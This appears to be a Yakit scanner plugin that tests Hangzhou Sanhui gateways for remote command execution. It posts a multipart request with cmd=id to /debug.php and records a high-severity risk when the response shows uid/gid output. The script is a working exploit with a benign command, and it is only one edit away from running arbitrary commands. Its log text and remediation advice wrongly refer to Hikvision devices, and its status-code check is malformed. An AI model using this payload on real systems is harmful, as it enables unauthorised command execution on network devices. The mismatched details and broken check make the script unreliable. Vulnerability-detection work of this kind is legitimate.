script_name: 杭州 三汇网关debug存在远程代码执行漏洞
content:
#端口扫描插件，在每一次扫描端口会执行
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `POST /debug.php HTTP/1.1
Host: {{params(target)}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoDIsCqVMmF83ptmp

------WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Disposition: form-data; name="comdtype"

1
------WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Disposition: form-data; name="cmd"

id
------WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Disposition: form-data; name="run"

------WebKitFormBoundaryoDIsCqVMmF83ptmp--


`



    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    if !poc.GetStatusCodeFromResponse(rsp) == 200{
     return
     } 
       
    if str.MatchAllOfSubString(rsp, "uid=")&& str.MatchAllOfSubString(rsp, "gid=")  {
    yakit.Info("海康detection远程命令执行漏洞复现", addr)
    	risk.NewRisk(
    	addr,
        risk.title("三汇网关debug存在远程代码执行漏洞"),
        risk.severity("high"),
        risk.payload("id"),
        risk.titleVerbose("三汇网关debug存在远程代码执行漏洞"),
        risk.type('rce'), 
        risk.parameter("cmd"), 
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.description("杭州三汇网关debug存在远程代码执行漏洞"),
        risk.solution("升级到最新版本的海康威视设备固件，并确保所有补丁已应用。同时，审查应用程序中的所有输入验证机制，确保使用白名单策略来限制命令执行的风险。"),
        risk.cve("no cve"),
    )	
     return
}
}


handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
    
}
